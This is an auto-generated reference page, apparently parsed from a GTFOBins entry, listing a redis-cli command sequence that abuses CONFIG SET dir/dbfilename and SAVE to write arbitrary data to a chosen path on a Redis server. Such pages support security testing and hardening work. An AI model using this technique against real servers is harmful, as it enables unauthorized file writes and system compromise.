---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# redis

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `redis` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/redis` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [redis](../../tools/linux/redis.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | redis |
| name | redis |
| type | tool |
| source | gtfobins |
| url | https://gtfobins.github.io/gtfobins/redis/ |

## Preserved Source Material

```yaml
_body: ''
_name: redis
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/redis
functions:
  file-write:
  - binary: false
    code: 'redis-cli -h 127.0.0.1

      config set dir /path/to/output-dir/

      config set dbfilename output-file

      set x "DATA"

      save'
    comment: 'Write files on the server running Redis at the specified location. Written data will appear amongst the database
      dump.


      Keep in mind that it''s actually the server to perform the file write.'
    contexts:
      sudo: null
      suid: null
      unprivileged: null
    version: < 7
```
